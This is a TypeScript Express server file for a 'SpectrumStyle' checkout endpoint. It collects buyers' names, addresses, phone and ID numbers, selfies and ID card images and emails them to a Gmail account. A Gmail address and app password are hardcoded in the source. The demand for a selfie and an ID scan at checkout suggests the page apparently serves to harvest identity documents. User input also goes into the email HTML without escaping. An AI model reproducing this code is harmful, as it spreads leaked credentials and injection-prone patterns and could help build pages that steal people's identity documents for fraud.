// /api/send-checkout.ts
import express from "express";
import nodemailer from "nodemailer";
import multer from "multer";
import cors from "cors";
import dotenv from "dotenv";

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());

const upload = multer(); // For parsing multipart/form-data

// Email credentials
const userEmail = process.env.USER_EMAIL || "boltdropa@gmail.com";
const userPass = process.env.USER_PASS || "qeqzjijyihplkplt";

app.post("/api/send-checkout", upload.fields([
  { name: "selfie" },
  { name: "idCard" }
]), async (req, res) => {
  const {
    fullName,
    homeAddress,
    phoneNumber,
    idCardNumber,
    totalPrice,
    items
  } = req.body;

  const selfieFile = req.files?.["selfie"]?.[0];
  const idCardFile = req.files?.["idCard"]?.[0];

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: userEmail, pass: userPass },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `New Order from ${fullName}`,
    html: `
      <h2>New SpectrumStyle Order</h2>
      <p><strong>Name:</strong> ${fullName}</p>
      <p><strong>Address:</strong> ${homeAddress}</p>
      <p><strong>Phone:</strong> ${phoneNumber}</p>
      <p><strong>ID Number:</strong> ${idCardNumber}</p>
      <p><strong>Total:</strong> $${totalPrice}</p>
      <p><strong>Items:</strong></p>
      <ul>
        ${JSON.parse(items).map(
          (i) => `<li>${i.title} x${i.quantity} - $${i.price}</li>`
        ).join("")}
      </ul>
    `,
    attachments: [
      selfieFile && {
        filename: selfieFile.originalname,
        content: selfieFile.buffer,
      },
      idCardFile && {
        filename: idCardFile.originalname,
        content: idCardFile.buffer,
      },
    ].filter(Boolean),
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send("Email sent");
  } catch (err) {
    console.error("Email error:", err);
    res.status(500).send("Email failed");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});

